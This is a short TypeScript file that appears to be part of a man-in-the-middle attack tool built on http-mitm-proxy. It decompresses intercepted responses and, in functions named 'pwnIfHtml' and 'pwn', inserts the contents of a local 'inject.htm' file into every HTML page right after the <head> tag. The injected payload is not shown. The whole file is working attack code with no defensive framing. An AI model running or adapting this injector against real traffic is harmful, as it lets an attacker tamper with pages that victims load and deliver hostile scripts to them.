import * as fs from 'fs';
import * as HttpMitmProxy from 'http-mitm-proxy';

export function handleMainPage(ctx: HttpMitmProxy.IContext, proceed: (error?: Error) => void) {
  const req = ctx.clientToProxyRequest;
  let encoding = req.headers['accept-encoding'];
  if (encoding)
    ctx.use(HttpMitmProxy.gunzip);
  ctx.onResponse(pwnIfHtml);
  return proceed();
}

function pwnIfHtml(ctx: HttpMitmProxy.IContext, proceed: (error?: Error) => void) {
  let contentType = ctx.serverToProxyResponse.headers['content-type'];
  if (contentType?.indexOf('text/html') !== -1)
    ctx.onResponseData(pwn);
  return proceed();
}

function pwn(ctx: HttpMitmProxy.IContext, chunk: Buffer, proceed: (error?: Error, chunk?: Buffer) => void) {
  const search = '<head>';
  let injectionPoint = chunk.indexOf(search);
  if (injectionPoint !== -1) {
    injectionPoint += search.length;
    const injection = fs.readFileSync(__dirname + '/inject.htm');
    chunk = Buffer.concat([
      chunk.subarray(0, injectionPoint),
      injection,
      chunk.subarray(injectionPoint)
    ]);
  }
  return proceed(undefined, chunk);
}

